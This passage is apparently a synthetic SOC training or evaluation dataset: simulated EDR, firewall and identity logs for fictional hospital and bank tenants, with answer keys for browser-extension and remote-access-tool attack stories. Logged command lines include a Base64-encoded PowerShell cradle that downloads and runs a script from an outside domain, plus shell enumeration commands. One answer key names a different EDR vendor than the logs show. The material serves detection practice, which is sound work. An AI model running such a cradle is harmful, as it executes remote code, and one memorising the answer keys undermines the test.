 "event.id": "01KSF5X7T0CEYC2G6APCJ6W64P_646",
 "trace.id": "01KSF5X7T0CEYC2G6APCJ6W64P",
 "packet.id": "5DD2530B1A34135D4233620D44A59F60",
 "i.scheme": "edr",
 "i.version": "preprocess-lib-1.0",
 "dataSource.name": "SentinelOne",
 "dataSource.vendor": "SentinelOne",
 "dataSource.category": "security",
 "account.id": "1822094290004415789",
 "account.name": "Medcore",
 "site.id": "1856573321780923295",
 "site.name": "Medcore-HQ",
 "group.id": "1823415222326874252",
 "mgmt.id": "94579",
 "mgmt.url": "euce1-108.sentinelone.net",
 "mgmt.osRevision": "26100",
 "agent.uuid": "35bce53651b590f923ed4f49cbb781cc",
 "agent.version": "25.1.3.334",
 "endpoint.name": "WS-NURS-044",
 "endpoint.os": "windows",
 "endpoint.type": "desktop",
 "os.name": "Windows 11 Enterprise",
 "process.unique.key": "8C926F594204D9ED",
 "src.process.name": "chrome.exe",
 "src.process.displayName": "Google Chrome",
 "src.process.pid": 8814,
 "src.process.uid": "BE83064289D704F0",
 "src.process.image.path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
 "src.process.user": "MEDCORE\\dr.peters",
 "src.process.storyline.id": "05724D10744DBC80",
 "src.process.isStorylineRoot": false,
 "tgt.process.name": "powershell.exe",
 "tgt.process.displayName": "Windows PowerShell",
 "tgt.process.pid": 9021,
 "tgt.process.uid": "8C926F594204D9ED",
 "tgt.process.cmdline": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQBhAHMAcwBlAHQAcwAtAHUAcABkAGEAdABlAC4AeAB5AHoALwBiAC4AcABzADEAJwApAA==",
 "tgt.process.image.path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
 "tgt.process.image.binaryIsExecutable": true,
 "tgt.process.user": "MEDCORE\\dr.peters",
 "tgt.process.integrityLevel": "MEDIUM",
 "tgt.process.sessionId": 1,
 "tgt.process.startTime": 1779699720000,
 "tgt.process.storyline.id": "05724D10744DBC80",
 "tgt.process.isStorylineRoot": false,
 "tgt.process.signedStatus": "signed",
 "tgt.process.verifiedStatus": "verified",
 "tgt.process.publisher": "MICROSOFT WINDOWS",
 "tgt.process.subsystem": "SYS_WIN32",
 "tgt.process.isNative64Bit": false,
 "tgt.process.isRedirectCmdProcessor": false
}
```

- 2026-05-25T09:02:30.000Z | badge=firewall | vendor=Check Point | sev=high | host=WS-NURS-044 | user=dr.peters | "WS-NURS-044 connected to cdn-assets-update.xyz"

NATIVE — Check Point Quantum Security Gateway (checkpoint/url_filtering)
```
<134>1 2026-05-25T09:02:30Z gw-hq-01 CheckPoint 26144 - [action:"Accept"; flags:"411908"; ifdir:"outbound"; ifname:"eth1"; logid:"0"; loguid:"{0x6a141026,0x0,0xdf2242d5,0x61ebba39}"; origin:"192.168.0.1"; originsicname:"CN=gw-hq-01,O=mgmt-hq.medcore-health.org.1f1d81"; sequencenum:"1"; time:"1779699750"; version:"5"; __policy_id_tag:"product=VPN-1 & FireWall-1[db_tag={B2E64C8C-4CD4-4694-9270-444DBF85F093};mgmt=mgmt-hq;date=1779580800;policy_name=Corp_Policy\]"; app_category:"Uncategorized"; app_id:"0"; app_risk:"0"; appi_name:"cdn-assets-update.xyz"; dst:"185.220.101.77"; inzone:"Internal"; layer_name:"Network"; layer_name:"Web Control"; layer_uuid:"e82764d6-ef09-4edf-b9f8-66db00e9d6b0"; layer_uuid:"d6d669fe-36b1-4f15-bdb1-c9fc091c3b23"; match_id:"23"; match_id:"33554439"; matched_category:"Uncategorized"; parent_rule:"0"; parent_rule:"23"; product:"URL Filtering"; proto:"6"; proxy_src_ip:"192.168.10.18"; resource:"https://cdn-assets-update.xyz"; rule_action:"Inline"; rule_action:"Accept"; rule_name:"ALLOW-OUTBOUND-HTTPS"; rule_name:"Allow uncategorized"; rule_uid:"4217f465-5c09-473e-8232-52b2f8718a3f"; rule_uid:"794c12fe-4f19-4040-999a-ac986e31682b"; outzone:"External"; s_port:"53718"; service:"443"; service_id:"https"; src:"192.168.10.18"; src_machine_name:"WS-NURS-044"; src_user_name:"dr.peters"; xlatesrc:"176.58.155.10"; xlatesport:"55813"; xlatedst:"0.0.0.0"; xlatedport:"0"]
```

- 2026-05-25T09:04:00.000Z | badge=edr | vendor=SentinelOne | sev=critical | host=WS-NURS-044 | user=dr.peters | "Threat detected on WS-NURS-044"

NATIVE — SentinelOne Singularity (sentinelone/threat)
```json
{
 "id": "1815401025861836014",
 "agentDetectionInfo": {
  "accountId": "1822094290004415789",
  "accountName": "Medcore",
  "agentDetectionState": null,
  "agentDomain": "MEDCORE",
  "agentIpV4": "10.40.71.89",
  "agentLastLoggedInUpn": "dr.peters@medcorehealth.org",
  "agentLastLoggedInUserName": "dr.peters",
  "agentMitigationMode": "protect",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentUuid": "35bce53651b590f923ed4f49cbb781cc",
  "agentVersion": "25.1.3.334",
  "externalIp": "176.58.155.10",
  "groupId": "1823415222326874252",
  "groupName": "Workstations",
  "siteId": "1856573321780923295",
  "siteName": "Medcore-HQ"
 },
 "agentRealtimeInfo": {
  "accountId": "1822094290004415789",
  "accountName": "Medcore",
  "activeThreats": 0,
  "agentComputerName": "WS-NURS-044",
  "agentDecommissionedAt": null,
  "agentDomain": "MEDCORE",
  "agentId": "1821172370182436541",
  "agentInfected": false,
  "agentIsActive": true,
  "agentIsDecommissioned": false,
  "agentMachineType": "desktop",
  "agentMitigationMode": "protect",
  "agentNetworkStatus": "connected",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentOsType": "windows",
  "agentUuid": "35bce53651b590f923ed4f49cbb781cc",
  "agentVersion": "25.1.3.334",
  "groupId": "1823415222326874252",
  "groupName": "Workstations",
  "networkInterfaces": [
   {
    "id": "1813429322366455649",
    "inet": [
     "10.40.71.89"
    ],
    "inet6": [
     "fe80::cf6f:673f:efe3:2b5d"
    ],
    "name": "Ethernet",
    "physical": "0F:E2:78:27:43:4B"
   }
  ],
  "operationalState": "na",
  "rebootRequired": false,
  "siteId": "1856573321780923295",
  "siteName": "Medcore-HQ",
  "userActionsNeeded": []
 },
 "containerInfo": {
  "id": null,
  "image": null,
  "labels": null,
  "name": null
 },
 "indicators": [
  {
   "category": "General",
   "description": "known_malware_family",
   "ids": [
    948
   ],
   "tactics": [
    {
     "name": "Execution",
     "source": "MITRE",
     "techniques": [
      {
       "link": "https://attack.mitre.org/techniques/T1059/001/",
       "name": "T1059.001"
      }
     ]
    }
   ]
  }
 ],
 "kubernetesInfo": {
  "cluster": null,
  "controllerKind": null,
  "controllerLabels": null,
  "controllerName": null,
  "namespace": null,
  "namespaceLabels": null,
  "node": null,
  "pod": null,
  "podLabels": null
 },
 "mitigationStatus": [
  {
   "action": "kill",
   "actionsCounters": {
    "failed": 0,
    "notFound": 0,
    "pendingReboot": 0,
    "success": 1,
    "total": 1
   },
   "agentSupportsReport": true,
   "groupN
```

#### ANSWER KEY — browser-extension
- evt_bext_01_sideload: verdict=tp mitre=T1176 authored: Chrome relaunched on WS-NURS-044 with a --load-extension flag pointing to an unpacked folder in dr.peters's Downloads directory.
- evt_bext_02_powershell: verdict=tp mitre=T1059.001 authored: chrome.exe on WS-NURS-044 spawned powershell.exe directly, with a hidden window and a Base64-encoded command.
- evt_bext_03_beacon: verdict=tp mitre=T1071.001 authored: WS-NURS-044 opened an outbound HTTPS connection to cdn-assets-update.xyz, a domain registered 4 days ago; the firewall allowed the session.
- evt_bext_04_detect: verdict=tp mitre=T1059.001 authored: CrowdStrike Falcon killed the encoded PowerShell process and quarantined the sideloaded extension folder on WS-NURS-044, matching a known loader (family: ScriptBridge-variant).


### Story: tech-support-scam (foundation) — Tech-Support Scam → Unapproved Remote Access Tool

- 2026-05-27T14:00:00.000Z | badge=edr | vendor=SentinelOne | sev=low | host=WS-NURS-044 | user=dr.peters | "AnyDesk.exe, a signed remote-access tool with no prior install history on this host, was downloaded to dr.peters's Downloads folder on WS-NURS-044."

NATIVE — SentinelOne Singularity (sentinelone/File Creation)
```json
{
 "timestamp": "2026-05-27T14:00:00.000Z",
 "event.time": 1779890400000,
 "event.type": "File Creation",
 "event.category": "file",
 "meta.event.name": "FILECREATION",
 "event.id": "01KSMVRAR0C20WTGM8T28MYWR4_99",
 "trace.id": "01KSMVRAR0C20WTGM8T28MYWR4",
 "packet.id": "46B5C889151F195B914E282C45EAF49B",
 "i.scheme": "edr",
 "i.version": "preprocess-lib-1.0",
 "dataSource.name": "SentinelOne",
 "dataSource.vendor": "SentinelOne",
 "dataSource.category": "security",
 "account.id": "1822094290004415789",
 "account.name": "Medcore",
 "site.id": "1856573321780923295",
 "site.name": "Medcore-HQ",
 "group.id": "1823415222326874252",
 "mgmt.id": "94579",
 "mgmt.url": "euce1-108.sentinelone.net",
 "mgmt.osRevision": "26100",
 "agent.uuid": "35bce53651b590f923ed4f49cbb781cc",
 "agent.version": "25.1.3.334",
 "endpoint.name": "WS-NURS-044",
 "endpoint.os": "windows",
 "endpoint.type": "desktop",
 "os.name": "Windows 11 Enterprise",
 "tgt.file.path": "C:\\Users\\dr.peters\\Downloads\\AnyDesk.exe",
 "tgt.file.extension": "exe",
 "tgt.file.size": 4192256,
 "tgt.file.type": "PE",
 "tgt.file.isExecutable": true,
 "tgt.file.location": "Local",
 "tgt.file.creationTime": 1779890400000,
 "tgt.file.modificationTime": 1779890400000,
 "tgt.file.id": "F2580B2358D6F9D016D5",
 "tgt.file.sha256": "9bb1a3108c1bf98fc6cfc48fe23f8daafce656e65af3dfdb615bcb90ef80780c",
 "tgt.file.isSigned": "signed"
}
```

- 2026-05-27T14:04:00.000Z | badge=edr | vendor=SentinelOne | sev=high | host=WS-NURS-044 | user=dr.peters | "explorer.exe started AnyDesk.exe on WS-NURS-044"

NATIVE — SentinelOne Singularity (sentinelone/Process Creation)
```json
{
 "timestamp": "2026-05-27T14:04:00.000Z",
 "event.time": 1779890640000,
 "event.type": "Process Creation",
 "event.category": "process",
 "meta.event.name": "PROCESSCREATION",
 "event.id": "01KSMVZN4066YJ8TJ62EYG0042_215",
 "trace.id": "01KSMVZN4066YJ8TJ62EYG0042",
 "packet.id": "541A05B53C078317FBB73C80C451073B",
 "i.scheme": "edr",
 "i.version": "preprocess-lib-1.0",
 "dataSource.name": "SentinelOne",
 "dataSource.vendor": "SentinelOne",
 "dataSource.category": "security",
 "account.id": "1822094290004415789",
 "account.name": "Medcore",
 "site.id": "1856573321780923295",
 "site.name": "Medcore-HQ",
 "group.id": "1823415222326874252",
 "mgmt.id": "94579",
 "mgmt.url": "euce1-108.sentinelone.net",
 "mgmt.osRevision": "26100",
 "agent.uuid": "35bce53651b590f923ed4f49cbb781cc",
 "agent.version": "25.1.3.334",
 "endpoint.name": "WS-NURS-044",
 "endpoint.os": "windows",
 "endpoint.type": "desktop",
 "os.name": "Windows 11 Enterprise",
 "process.unique.key": "2696C9FA48753B2D",
 "src.process.name": "explorer.exe",
 "src.process.displayName": "Windows Explorer",
 "src.process.pid": 3140,
 "src.process.uid": "0E7140A8324FA1B7",
 "src.process.image.path": "C:\\Windows\\explorer.exe",
 "src.process.user": "MEDCORE\\dr.peters",
 "src.process.storyline.id": "A35C5D41270636E9",
 "src.process.isStorylineRoot": true,
 "src.process.signedStatus": "signed",
 "src.process.verifiedStatus": "verified",
 "src.process.publisher": "MICROSOFT WINDOWS",
 "tgt.process.name": "AnyDesk.exe",
 "tgt.process.pid": 5210,
 "tgt.process.uid": "2696C9FA48753B2D",
 "tgt.process.cmdline": "\"C:\\Users\\dr.peters\\Downloads\\AnyDesk.exe\"",
 "tgt.process.image.path": "C:\\Users\\dr.peters\\Downloads\\AnyDesk.exe",
 "tgt.process.image.sha256": "9bb1a3108c1bf98fc6cfc48fe23f8daafce656e65af3dfdb615bcb90ef80780c",
 "tgt.process.image.binaryIsExecutable": true,
 "tgt.process.user": "MEDCORE\\dr.peters",
 "tgt.process.integrityLevel": "MEDIUM",
 "tgt.process.sessionId": 1,
 "tgt.process.startTime": 1779890640000,
 "tgt.process.storyline.id": "7E4F97C1EFB33681",
 "tgt.process.isStorylineRoot": true,
 "tgt.process.signedStatus": "signed",
 "tgt.process.verifiedStatus": "verified",
 "tgt.process.subsystem": "SYS_WIN32",
 "tgt.process.isNative64Bit": false,
 "tgt.process.isRedirectCmdProcessor": false
}
```

- 2026-05-27T14:05:30.000Z | badge=edr | vendor=SentinelOne | sev=medium | host=WS-NURS-044 | user=dr.peters | "AnyDesk.exe started cmd.exe on WS-NURS-044"

NATIVE — SentinelOne Singularity (sentinelone/Process Creation)
```json
{
 "timestamp": "2026-05-27T14:05:30.000Z",
 "event.time": 1779890730000,
 "event.type": "Process Creation",
 "event.category": "process",
 "meta.event.name": "PROCESSCREATION",
 "event.id": "01KSMW1FQ0MMMJAWJEM0JJ6GYG_117",
 "trace.id": "01KSMW1FQ0MMMJAWJEM0JJ6GYG",
 "packet.id": "AB831338BC3E67BF6BADCDF74F841A91",
 "i.scheme": "edr",
 "i.version": "preprocess-lib-1.0",
 "dataSource.name": "SentinelOne",
 "dataSource.vendor": "SentinelOne",
 "dataSource.category": "security",
 "account.id": "1822094290004415789",
 "account.name": "Medcore",
 "site.id": "1856573321780923295",
 "site.name": "Medcore-HQ",
 "group.id": "1823415222326874252",
 "mgmt.id": "94579",
 "mgmt.url": "euce1-108.sentinelone.net",
 "mgmt.osRevision": "26100",
 "agent.uuid": "35bce53651b590f923ed4f49cbb781cc",
 "agent.version": "25.1.3.334",
 "endpoint.name": "WS-NURS-044",
 "endpoint.os": "windows",
 "endpoint.type": "desktop",
 "os.name": "Windows 11 Enterprise",
 "process.unique.key": "4C25AC201BC9F3BD",
 "src.process.name": "AnyDesk.exe",
 "src.process.pid": 5210,
 "src.process.uid": "2696C9FA48753B2D",
 "src.process.user": "MEDCORE\\dr.peters",
 "src.process.storyline.id": "7E4F97C1EFB33681",
 "src.process.isStorylineRoot": false,
 "tgt.process.name": "cmd.exe",
 "tgt.process.displayName": "Windows Command Processor",
 "tgt.process.pid": 5540,
 "tgt.process.uid": "4C25AC201BC9F3BD",
 "tgt.process.cmdline": "cmd.exe /c systeminfo & netstat -ano",
 "tgt.process.image.path": "C:\\Windows\\System32\\cmd.exe",
 "tgt.process.image.binaryIsExecutable": true,
 "tgt.process.user": "MEDCORE\\dr.peters",
 "tgt.process.integrityLevel": "MEDIUM",
 "tgt.process.sessionId": 1,
 "tgt.process.startTime": 1779890730000,
 "tgt.process.storyline.id": "7E4F97C1EFB33681",
 "tgt.process.isStorylineRoot": false,
 "tgt.process.signedStatus": "signed",
 "tgt.process.verifiedStatus": "verified",
 "tgt.process.publisher": "MICROSOFT WINDOWS",
 "tgt.process.subsystem": "SYS_WIN32",
 "tgt.process.isNative64Bit": false,
 "tgt.process.isRedirectCmdProcessor": false
}
```

- 2026-05-27T14:06:00.000Z | badge=edr | vendor=SentinelOne | sev=critical | host=WS-NURS-044 | user=dr.peters | "Threat detected on WS-NURS-044"

NATIVE — SentinelOne Singularity (sentinelone/threat)
```json
{
 "id": "1810518152238564302",
 "agentDetectionInfo": {
  "accountId": "1822094290004415789",
  "accountName": "Medcore",
  "agentDetectionState": null,
  "agentDomain": "MEDCORE",
  "agentIpV4": "10.40.71.89",
  "agentLastLoggedInUpn": "dr.peters@medcorehealth.org",
  "agentLastLoggedInUserName": "dr.peters",
  "agentMitigationMode": "protect",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentUuid": "35bce53651b590f923ed4f49cbb781cc",
  "agentVersion": "25.1.3.334",
  "externalIp": "176.58.155.10",
  "groupId": "1823415222326874252",
  "groupName": "Workstations",
  "siteId": "1856573321780923295",
  "siteName": "Medcore-HQ"
 },
 "agentRealtimeInfo": {
  "accountId": "1822094290004415789",
  "accountName": "Medcore",
  "activeThreats": 0,
  "agentComputerName": "WS-NURS-044",
  "agentDecommissionedAt": null,
  "agentDomain": "MEDCORE",
  "agentId": "1821172370182436541",
  "agentInfected": false,
  "agentIsActive": true,
  "agentIsDecommissioned": false,
  "agentMachineType": "desktop",
  "agentMitigationMode": "protect",
  "agentNetworkStatus": "connected",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentOsType": "windows",
  "agentUuid": "35bce53651b590f923ed4f49cbb781cc",
  "agentVersion": "25.1.3.334",
  "groupId": "1823415222326874252",
  "groupName": "Workstations",
  "networkInterfaces": [
   {
    "id": "1813429322366455649",
    "inet": [
     "10.40.71.89"
    ],
    "inet6": [
     "fe80::cf6f:673f:efe3:2b5d"
    ],
    "name": "Ethernet",
    "physical": "0F:E2:78:27:43:4B"
   }
  ],
  "operationalState": "na",
  "rebootRequired": false,
  "siteId": "1856573321780923295",
  "siteName": "Medcore-HQ",
  "userActionsNeeded": []
 },
 "containerInfo": {
  "id": null,
  "image": null,
  "labels": null,
  "name": null
 },
 "indicators": [
  {
   "category": "PostExploitation",
   "description": "Suspicious activity",
   "ids": [
    619
   ],
   "tactics": [
    {
     "name": "Command and Control",
     "source": "MITRE",
     "techniques": [
      {
       "link": "https://attack.mitre.org/techniques/T1219/",
       "name": "T1219"
      }
     ]
    }
   ]
  }
 ],
 "kubernetesInfo": {
  "cluster": null,
  "controllerKind": null,
  "controllerLabels": null,
  "controllerName": null,
  "namespace": null,
  "namespaceLabels": null,
  "node": null,
  "pod": null,
  "podLabels": null
 },
 "mitigationStatus": [
  {
   "action": "kill",
   "actionsCounters": {
    "failed": 0,
    "notFound": 0,
    "pendingReboot": 0,
    "success": 1,
    "total": 1
   },
   "agentSupportsReport": true,

```

#### ANSWER KEY — tech-support-scam
- evt_rat_01_download: verdict=- mitre=- authored: AnyDesk.exe, a signed remote-access tool with no prior install history on this host, was downloaded to dr.peters's Downloads folder on WS-NURS-044.
- evt_rat_02_execute: verdict=tp mitre=T1219 authored: dr.peters launched AnyDesk.exe on WS-NURS-044 and granted remote-control access to an inbound session from an external caller.
- evt_rat_03_shell: verdict=tp mitre=T1059.003 authored: cmd.exe was spawned directly by AnyDesk.exe on WS-NURS-044 and ran basic system and network enumeration commands.
- evt_rat_04_detect: verdict=tp mitre=T1219 authored: SentinelOne terminated AnyDesk.exe on WS-NURS-044 after flagging it as an unapproved remote-access tool controlling a session and spawning shell commands.


## quantumbank — stack {"edr":"sentinelone","firewall":"paloalto"} (effective products: edr=SentinelOne, firewall=Palo Alto Networks)

### Background feed sample (benign noise)

- 2026-05-10T08:00:00.000Z | badge=okta | vendor=Okta | sev=informational | host=WKS-QB-055 | user=f.zimmermann | "Signed in to Okta (FIDO2) on WKS-QB-055"

NATIVE — Okta Workforce Identity (System Log) (okta/user.session.start)
```json
{
 "actor": {
  "alternateId": "f.zimmermann@quantumbank.ch",
  "detailEntry": null,
  "displayName": "F Zimmermann",
  "id": "00u1VEnts7gbhEusFb1x",
  "type": "User"
 },
 "authenticationContext": {
  "authenticationProvider": null,
  "authenticationStep": 0,
  "credentialProvider": null,
  "credentialType": null,
  "externalSessionId": "102mkMp2mK2dHr8bpf5YeBlc1",
  "interface": null,
  "issuer": null
 },
 "client": {
  "device": "Computer",
  "geographicalContext": {
   "city": null,
   "country": null,
   "geolocation": {
    "lat": null,
    "lon": null
   },
   "postalCode": null,
   "state": null
  },
  "id": null,
  "ipAddress": "10.100.1.55",
  "userAgent": {
   "browser": "CHROME",
   "os": "Windows 10",
   "rawUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
  },
  "zone": "Corporate HQ"
 },
 "debugContext": {
  "debugData": {
   "behaviors": "{New Geo-Location=NEGATIVE, New Device=NEGATIVE, New IP=NEGATIVE, New State=NEGATIVE, New Country=NEGATIVE, Velocity=NEGATIVE, New City=NEGATIVE}",
   "deviceFingerprint": "c972fb0af13e5b257ab02f3755d20bc3",
   "dtHash": "746fef7fd26813cb15e8ada7bd6ea418ec9e764fd7c33e6bfec8f6607491ac3d",
   "requestId": "bHObsNipbS4HtLDjQOyMc08AAAo",
   "requestUri": "/idp/idx/authenticators/poll",
   "risk": "{level=LOW}",
   "threatSuspected": "false",
   "url": "/idp/idx/authenticators/poll?"
  }
 },
 "device": null,
 "displayMessage": "User login to Okta",
 "eventType": "user.session.start",
 "legacyEventType": "core.user_auth.login_success",
 "outcome": {
  "reason": null,
  "result": "SUCCESS"
 },
 "published": "2026-05-10T08:00:00.000Z",
 "request": {
  "ipChain": [
   {
    "geographicalContext": {
     "city": null,
     "country": null,
     "geolocation": {
      "lat": null,
      "lon": null
     },
     "postalCode": null,
     "state": null
    },
    "ip": "10.100.1.55",
    "source": null,
    "version": "V4"
   }
  ]
 },
 "securityContext": {
  "asNumber": null,
  "asOrg": null,
  "domain": null,
  "isProxy": null,
  "isp": null
 },
 "severity": "INFO",
 "target": null,
 "transaction": {
  "detail": {},
  "id": "bHObsNipbS4HtLDjQOyMc08AAAo",
  "type": "WEB"
 },
 "uuid": "ac289aef-9bd2-11f1-863b-c43e86892049",
 "version": "0"
}
```


### Story: browser-extension (foundation) — Sideloaded Browser Extension → PowerShell Spawned by Chrome

- 2026-05-25T09:00:00.000Z | badge=edr | vendor=SentinelOne | sev=low | host=WKS-QB-077 | user=b.schwarzer | "explorer.exe started chrome.exe on WKS-QB-077"

NATIVE — SentinelOne Singularity (sentinelone/Process Creation)
```json
{
 "timestamp": "2026-05-25T09:00:00.000Z",
 "event.time": 1779699600000,
 "event.type": "Process Creation",
 "event.category": "process",
 "meta.event.name": "PROCESSCREATION",
 "event.id": "01KSF5SJM0ET668WTYECPPC8YR_171",
 "trace.id": "01KSF5SJM0ET668WTYECPPC8YR",
 "packet.id": "E9F459178D4F71A2B1926AC80AE6CC1B",
 "i.scheme": "edr",
 "i.version": "preprocess-lib-1.0",
 "dataSource.name": "SentinelOne",
 "dataSource.vendor": "SentinelOne",
 "dataSource.category": "security",
 "account.id": "1811388925835092259",
 "account.name": "Quantumbank",
 "site.id": "1894613334159270636",
 "site.name": "Quantumbank-HQ",
 "group.id": "1857524634001073935",
 "mgmt.id": "98725",
 "mgmt.url": "usea1-012.sentinelone.net",
 "mgmt.osRevision": "26100",
 "agent.uuid": "411044c64c09eecec98757559e74c245",
 "agent.version": "25.1.3.334",
 "endpoint.name": "WKS-QB-077",
 "endpoint.os": "windows",
 "endpoint.type": "desktop",
 "os.name": "Windows 11 Enterprise",
 "process.unique.key": "D056CD023F863350",
 "src.process.name": "explorer.exe",
 "src.process.displayName": "Windows Explorer",
 "src.process.pid": 3140,
 "src.process.uid": "12855A07F46AEACD",
 "src.process.image.path": "C:\\Windows\\explorer.exe",
 "src.process.user": "QUANTUMBANK\\b.schwarzer",
 "src.process.storyline.id": "AFE6569E92CF6A91",
 "src.process.isStorylineRoot": true,
 "src.process.signedStatus": "signed",
 "src.process.verifiedStatus": "verified",
 "src.process.publisher": "MICROSOFT WINDOWS",
 "tgt.process.name": "chrome.exe",
 "tgt.process.displayName": "Google Chrome",
 "tgt.process.pid": 8814,
 "tgt.process.uid": "D056CD023F863350",
 "tgt.process.cmdline": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --load-extension=\"C:\\Users\\b.schwarzer\\Downloads\\perf_boost_ext_unpacked\"",
 "tgt.process.image.path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
 "tgt.process.image.binaryIsExecutable": true,
 "tgt.process.user": "QUANTUMBANK\\b.schwarzer",
 "tgt.process.integrityLevel": "MEDIUM",
 "tgt.process.sessionId": 1,
 "tgt.process.startTime": 1779699600000,
 "tgt.process.storyline.id": "4F292D5857386168",
 "tgt.process.isStorylineRoot": true,
 "tgt.process.subsystem": "SYS_WIN32",
 "tgt.process.isNative64Bit": false,
 "tgt.process.isRedirectCmdProcessor": false
}
```

- 2026-05-25T09:02:00.000Z | badge=edr | vendor=SentinelOne | sev=high | host=WKS-QB-077 | user=b.schwarzer | "chrome.exe started powershell.exe on WKS-QB-077"

NATIVE — SentinelOne Singularity (sentinelone/Process Creation)
```json
{
 "timestamp": "2026-05-25T09:02:00.000Z",
 "event.time": 1779699720000,
 "event.type": "Process Creation",
 "event.category": "process",
 "meta.event.name": "PROCESSCREATION",
 "event.id": "01KSF5X7T0MAGWE86PE6GGC2E2_646",
 "trace.id": "01KSF5X7T0MAGWE86PE6GGC2E2",
 "packet.id": "AA1C0FBDF2221CDEB0D46C3AB14AC474",
 "i.scheme": "edr",
 "i.version": "preprocess-lib-1.0",
 "dataSource.name": "SentinelOne",
 "dataSource.vendor": "SentinelOne",
 "dataSource.category": "security",
 "account.id": "1811388925835092259",
 "account.name": "Quantumbank",
 "site.id": "1894613334159270636",
 "site.name": "Quantumbank-HQ",
 "group.id": "1857524634001073935",
 "mgmt.id": "98725",
 "mgmt.url": "usea1-012.sentinelone.net",
 "mgmt.osRevision": "26100",
 "agent.uuid": "411044c64c09eecec98757559e74c245",
 "agent.version": "25.1.3.334",
 "endpoint.name": "WKS-QB-077",
 "endpoint.os": "windows",
 "endpoint.type": "desktop",
 "os.name": "Windows 11 Enterprise",
 "process.unique.key": "9A976863EE094B45",
 "src.process.name": "chrome.exe",
 "src.process.displayName": "Google Chrome",
 "src.process.pid": 8814,
 "src.process.uid": "D056CD023F863350",
 "src.process.image.path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
 "src.process.user": "QUANTUMBANK\\b.schwarzer",
 "src.process.storyline.id": "4F292D5857386168",
 "src.process.isStorylineRoot": false,
 "tgt.process.name": "powershell.exe",
 "tgt.process.displayName": "Windows PowerShell",
 "tgt.process.pid": 9021,
 "tgt.process.uid": "9A976863EE094B45",
 "tgt.process.cmdline": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQBhAHMAcwBlAHQAcwAtAHUAcABkAGEAdABlAC4AeAB5AHoALwBiAC4AcABzADEAJwApAA==",
 "tgt.process.image.path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
 "tgt.process.image.binaryIsExecutable": true,
 "tgt.process.user": "QUANTUMBANK\\b.schwarzer",
 "tgt.process.integrityLevel": "MEDIUM",
 "tgt.process.sessionId": 1,
 "tgt.process.startTime": 1779699720000,
 "tgt.process.storyline.id": "4F292D5857386168",
 "tgt.process.isStorylineRoot": false,
 "tgt.process.signedStatus": "signed",
 "tgt.process.verifiedStatus": "verified",
 "tgt.process.publisher": "MICROSOFT WINDOWS",
 "tgt.process.subsystem": "SYS_WIN32",
 "tgt.process.isNative64Bit": false,
 "tgt.process.isRedirectCmdProcessor": false
}
```

- 2026-05-25T09:02:30.000Z | badge=firewall | vendor=Palo Alto Networks | sev=high | host=WKS-QB-077 | user=b.schwarzer | "WKS-QB-077 connected to cdn-assets-update.xyz"

NATIVE — Palo Alto Networks PAN-OS (paloalto/THREAT)
```
<14>May 25 09:02:30 PA-3220-HQ 1,2026/05/25 09:02:30,013217932013,THREAT,url,2562,2026/05/25 09:02:30,10.100.1.18,185.220.101.77,213.100.197.10,185.220.101.77,ALLOW-OUTBOUND-HTTPS,qbank\b.schwarzer,,ssl,vsys1,trust,untrust,ethernet1/2,ethernet1/1,Panorama-Fwd,2026/05/25 09:02:30,444741,1,53718,443,55813,443,0x403000,tcp,allow,"cdn-assets-update.xyz/",(9999),newly-registered-domain,informational,client-to-server,2802411772299083207,0x0,10.0.0.0-10.255.255.255,,,,0,,,1,,,,,,,,0,0,0,0,0,,PA-3220-HQ,,,,,0,,0,,N/A,unknown,AppThreat-8988-9158,0x0,0,4294967295,,"newly-registered-domain,medium-risk",713299e0-b8ef-4f6a-94ac-6edcc8071b78,0,,,,,,,,,WKS-QB-077,,,,,,,,,,,,,,,,,,,,,2026-05-25T09:02:30.000+00:00,,,,encrypted-tunnel,networking,browser-based,4,"used-by-malware,able-to-transfer-file,has-known-vulnerability,tunnel-other-application,pervasive-use",,ssl,no,no,,NonProxyTraffic,
```

- 2026-05-25T09:04:00.000Z | badge=edr | vendor=SentinelOne | sev=critical | host=WKS-QB-077 | user=b.schwarzer | "Threat detected on WKS-QB-077"

NATIVE — SentinelOne Singularity (sentinelone/threat)
```json
{
 "id": "1815401025861836014",
 "agentDetectionInfo": {
  "accountId": "1811388925835092259",
  "accountName": "Quantumbank",
  "agentDetectionState": null,
  "agentDomain": "QBANK",
  "agentIpV4": "10.52.205.19",
  "agentLastLoggedInUpn": "b.schwarzer@quantumbank.ch",
  "agentLastLoggedInUserName": "b.schwarzer",
  "agentMitigationMode": "protect",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentUuid": "411044c64c09eecec98757559e74c245",
  "agentVersion": "25.1.3.334",
  "externalIp": "213.100.197.10",
  "groupId": "1857524634001073935",
  "groupName": "Workstations",
  "siteId": "1894613334159270636",
  "siteName": "Quantumbank-HQ"
 },
 "agentRealtimeInfo": {
  "accountId": "1811388925835092259",
  "accountName": "Quantumbank",
  "activeThreats": 0,
  "agentComputerName": "WKS-QB-077",
  "agentDecommissionedAt": null,
